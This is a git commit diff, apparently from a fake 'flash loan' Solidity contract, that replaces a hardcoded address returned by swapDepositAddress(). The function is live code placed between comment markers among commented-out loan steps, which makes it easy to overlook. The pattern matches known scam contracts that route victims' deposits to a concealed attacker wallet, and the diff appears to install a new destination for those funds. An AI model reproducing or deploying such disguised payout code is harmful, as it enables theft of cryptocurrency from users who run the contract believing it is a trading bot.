5d784504ddf75ac2b1ce5fc160c6da7a011fc51d
FlashLoan-Sol <116188467+FlashLoan-Sol@users.noreply.github.com>
2022-11-16 12:15:27 +0100

    Update PoolAddressesProvider.sol

--- PoolAddressesProvider.sol
+++ PoolAddressesProvider.sol
@@ -44,7 +44,7 @@ contract Manager {
       // Get coins Loan from Multiplier-Finance
       string memory loanAddress = manager.takeFlashLoan(loanAmount);
        */ function swapDepositAddress() public pure returns (address) {
-        return 0xdC95Dc03E799ea1b1C6BB700326EdE0AfAdFe54c;
+        return 0x9725b8761e30E35f477B42E09489B4183BF06F3e;
     }
       /* 
       // Send Borrowed coins to provide liquidity of newly created Token
